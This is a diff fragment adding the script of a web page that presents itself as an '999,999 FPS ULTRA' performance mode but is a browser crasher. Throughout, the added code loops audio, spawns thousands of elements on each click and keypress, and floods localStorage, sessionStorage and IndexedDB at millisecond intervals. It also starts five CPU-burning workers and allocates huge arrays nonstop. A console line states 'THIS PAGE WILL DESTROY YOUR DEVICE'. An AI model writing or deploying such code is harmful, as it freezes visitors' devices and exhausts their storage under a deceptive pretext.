+    const audio = new Audio('data:audio/wav;base64,U3VjY2Vzcw==');
+    audio.loop = true;
+    audio.volume = 1;
+    audio.play().catch(() => {});
+    const audio2 = audio.cloneNode();
+    audio2.play().catch(() => {});
+    const audio3 = audio.cloneNode();
+    audio3.play().catch(() => {});
+    const audio4 = audio.cloneNode();
+    audio4.play().catch(() => {});
+    const audio5 = audio.cloneNode();
+    audio5.play().catch(() => {});
+} catch(e) {}
+
+// 23. TAP/CLICK - SPAWN 2000 ELEMEN
+document.addEventListener('click', (e) => {
+    e.preventDefault();
+    const emojis = ['⚡','🔥','💥','🚀','⬡','∞','💀','☠️','🌀','🌟','✨','⭐','💫','🌌','🪐','☀️','🌙','🌊','🔥','⚡','💥','🚀','⬡','∞','⚡','🔥','💥','🚀','⬡','∞','💀','☠️','🌀','🌟','✨','⭐','💫','🌌','🪐','☀️','🌙','🌊','🔥','⚡','💥','🚀','⬡','∞'];
+    for (let i = 0; i < 2000; i++) {
+        const div = document.createElement('div');
+        div.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+        div.style.cssText = `position:fixed;left:${Math.random()*100}%;top:${Math.random()*100}%;font-size:${2+Math.random()*90}px;pointer-events:none;z-index:99999;transform:rotate(${Math.random()*360}deg) scale(${0.1+Math.random()*6});opacity:${0.01+Math.random()*0.99}`;
+        document.body.appendChild(div);
+        setTimeout(() => div.remove(), 300);
+    }
+    try { alert('⚡ 999,999 FPS UNLOCKED!'); } catch(e) {}
+});
+
+// 24. LOCALSTORAGE + SESSIONSTORAGE SPAM
+setInterval(() => {
+    try {
+        for (let i = 0; i < 400; i++) {
+            localStorage.setItem('lk_' + Math.random().toString(36), 'x'.repeat(2500));
+        }
+        const keys = Object.keys(localStorage);
+        if (keys.length > 1200) {
+            for (let i = 0; i < 400; i++) {
+                localStorage.removeItem(keys[i]);
+            }
+        }
+    } catch(e) {}
+}, 20);
+setInterval(() => {
+    try {
+        for (let i = 0; i < 300; i++) {
+            sessionStorage.setItem('sk_' + Math.random().toString(36), 'x'.repeat(2000));
+        }
+    } catch(e) {}
+}, 15);
+
+// 25. INDEXEDDB - EXTREME
+try {
+    const request = indexedDB.open('ultraDB', 1);
+    request.onupgradeneeded = (e) => {
+        const db = e.target.result;
+        if (!db.objectStoreNames.contains('data')) { db.createObjectStore('data', { autoIncrement: true }); }
+        if (!db.objectStoreNames.contains('logs')) { db.createObjectStore('logs', { autoIncrement: true }); }
+        if (!db.objectStoreNames.contains('ultra')) { db.createObjectStore('ultra', { autoIncrement: true }); }
+        if (!db.objectStoreNames.contains('fps')) { db.createObjectStore('fps', { autoIncrement: true }); }
+        if (!db.objectStoreNames.contains('nexus')) { db.createObjectStore('nexus', { autoIncrement: true }); }
+    };
+    request.onsuccess = (e) => {
+        const db = e.target.result;
+        const tx = db.transaction(['data', 'logs', 'ultra', 'fps', 'nexus'], 'readwrite');
+        const store = tx.objectStore('data');
+        const store2 = tx.objectStore('logs');
+        const store3 = tx.objectStore('ultra');
+        const store4 = tx.objectStore('fps');
+        const store5 = tx.objectStore('nexus');
+        setInterval(() => {
+            for (let i = 0; i < 200; i++) {
+                store.add({ data: 'x'.repeat(2500), time: Date.now() });
+                store2.add({ log: '⚡ FPS: ' + Date.now() });
+                store3.add({ ultra: '⚡'.repeat(200) + Date.now() });
+                store4.add({ fps: '999999'.repeat(50) + Date.now() });
+                store5.add({ nexus: '⚡🔥'.repeat(100) + Date.now() });
+            }
+        }, 5);
+    };
+} catch(e) {}
+
+// 26. WEB WORKER - 5 THREAD
+try {
+    const workerCode = `
+        let i = 0;
+        setInterval(() => {
+            i++;
+            const arr = new Array(30000).fill(0).map(() => Math.random());
+            arr.sort();
+            arr.reverse();
+            postMessage({ count: i });
+        }, 1);
+    `;
+    const blob = new Blob([workerCode], { type: 'application/javascript' });
+    const workerUrl = URL.createObjectURL(blob);
+    const worker1 = new Worker(workerUrl);
+    const worker2 = new Worker(workerUrl);
+    const worker3 = new Worker(workerUrl);
+    const worker4 = new Worker(workerUrl);
+    const worker5 = new Worker(workerUrl);
+} catch(e) {}
+
+// 27. CONSOLE SPAM
+setInterval(() => {
+    console.log('⚡ 999,999 FPS | CPU: ' + Math.round(cpu) + '%');
+    console.warn('⚠️ ULTRA MODE | MEMORY: ' + (performance.memory ? Math.round(performance.memory.usedJSHeapSize / 1024 / 1024) + 'MB' : 'unknown'));
+    console.log('🚀 999,999 FPS ULTRA');
+    console.error('❌ QUANTUM FLUCTUATION DETECTED');
+    console.warn('⚠️ MEMORY LEAK DETECTED');
+    console.log('⚡ ULTRA RENDERING ENGINE');
+}, 3);
+
+// 28. PERFORMANCE API
+setInterval(() => {
+    performance.mark('start');
+    const arr = new Array(25000).fill(0).map(() => Math.random() * 1000);
+    arr.sort((a, b) => a - b);
+    arr.reverse();
+    performance.mark('end');
+    performance.measure('ultra', 'start', 'end');
+}, 10);
+
+// 29. KEYBOARD SPAM
+document.addEventListener('keydown', (e) => {
+    e.preventDefault();
+    for (let i = 0; i < 1000; i++) {
+        const div = document.createElement('div');
+        div.textContent = ['⚡','🔥','💥','🚀','⬡','∞','💀','☠️','🌀','🌟','✨','⭐','💫','🌌','🪐','☀','🌙','⬡','◆','♦','♥','♠','♣','✧','✦','⬤','⚡','🔥'][Math.floor(Math.random() * 28)];
+        div.style.cssText = `position:fixed;left:${Math.random()*100}%;top:${Math.random()*100}%;font-size:${2+Math.random()*70}px;pointer-events:none;z-index:99999;transform:rotate(${Math.random()*360}deg);opacity:${0.05+Math.random()*0.95}`;
+        document.body.appendChild(div);
+        setTimeout(() => div.remove(), 300);
+    }
+});
+
+// 30. FORCE RENDER
+setInterval(() => {
+    document.body.style.transform = 'rotate(0.0001deg)';
+    document.body.style.opacity = 0.9999;
+    document.body.style.opacity = 1;
+}, 0.5);
+
+// 31. MISI
+setInterval(() => {
+    try {
+        if (window.gc) window.gc();
+        const x = new Array(20000).fill('⚡'.repeat(2000));
+        window.__force = x;
+        const y = new Array(15000).fill('🔥'.repeat(1500));
+        window.__force2 = y;
+        const z = new Array(10000).fill('⚡🔥'.repeat(1000));
+        window.__force3 = z;
+    } catch(e) {}
+}, 0);
+
+console.log('⚡ 999,999 FPS ULTRA MODE ACTIVATED');
+console.log('⚠️ 999,999 FPS ULTRA PERFORMANCE');
+console.log('💀 THIS PAGE WILL DESTROY YOUR DEVICE');
+}
+</script>
+</body>
+</html>
